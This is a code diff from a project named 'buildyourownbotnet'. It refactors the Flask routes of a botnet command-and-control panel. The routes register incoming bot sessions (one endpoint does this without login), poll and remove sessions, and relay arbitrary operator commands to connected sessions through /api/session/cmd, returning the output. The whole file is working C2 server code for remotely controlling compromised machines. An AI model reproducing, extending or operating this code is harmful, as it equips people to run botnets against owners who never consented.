@@ -1,14 +1,21 @@
 import json
-from flask import Blueprint, request, redirect, url_for, flash
+from flask import current_app, Blueprint, request, redirect, url_for, flash, jsonify
 from flask_login import login_user, logout_user, current_user, login_required
-from buildyourownbotnet import app, db, server
-from buildyourownbotnet.core import database
-from buildyourownbotnet.models import Session
+from buildyourownbotnet import c2
+from buildyourownbotnet.core.dao import session_dao, task_dao
+from buildyourownbotnet.models import db, Session
 
 
 # Blueprint
 session = Blueprint('session', __name__)
 
+
+@session.route("/api/session/new", methods=["POST"])
+def session_new():
+	"""Add session metadata to database."""
+	data = dict(request.json)
+	session_metadata = session_dao.handle_session(data)
+	return jsonify(session_metadata)
 
 @session.route("/api/session/remove", methods=["POST"])
 @login_required
@@ -21,7 +28,7 @@ def session_remove():
 		return redirect(url_for('sessions'))
 
 	# kill connection to C2
-	owner_sessions = server.c2.sessions.get(current_user.username, {})
+	owner_sessions = c2.sessions.get(current_user.username, {})
 
 	if session_uid and session_uid in owner_sessions:
 		session_thread = owner_sessions[session_uid]
@@ -31,11 +38,8 @@ def session_remove():
 			return "Error ending session - please try again."
 
 	# remove session from database
-	s = Session.query.filter_by(owner=current_user.username, uid=session_uid)
-	if s:
-		s.delete()
-		db.session.commit()
-		return "Session {} removed.".format(session_uid)
+	s = session_dao.delete_session(session_uid)
+	return "Session {} removed.".format(session_uid)
 
 
 @session.route("/api/session/cmd", methods=["POST"])
@@ -52,20 +56,20 @@ def session_cmd():
 	command = request.form.get('cmd')
 
 	# get user sessions
-	owner_sessions = server.c2.sessions.get(current_user.username, {})
+	owner_sessions = c2.sessions.get(current_user.username, {})
 
 	if session_uid in owner_sessions:
 		session_thread = owner_sessions[session_uid]
 
 		# store issued task in database
-		task = database.handle_task({'task': command, 'session': session_thread.info.get('uid')})
+		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
 		# send task and get response
 		session_thread.send_task(task)
 		response = session_thread.recv_task()
 
 		# update task record with result in database
-		result = database.handle_task(response)
+		result = task_dao.handle_task(response)
 		return str(result['result']).encode()
 
 	else:
@@ -77,7 +81,7 @@ def session_cmd():
 def session_poll():
 	"""Return list of sessions (JSON)."""
 	new_sessions = []
-	for s in database.get_sessions_new(current_user.id):
+	for s in session_dao.get_user_sessions_new(current_user.id):
 		new_sessions.append(s.serialize())
 		s.new = False
 		db.session.commit()
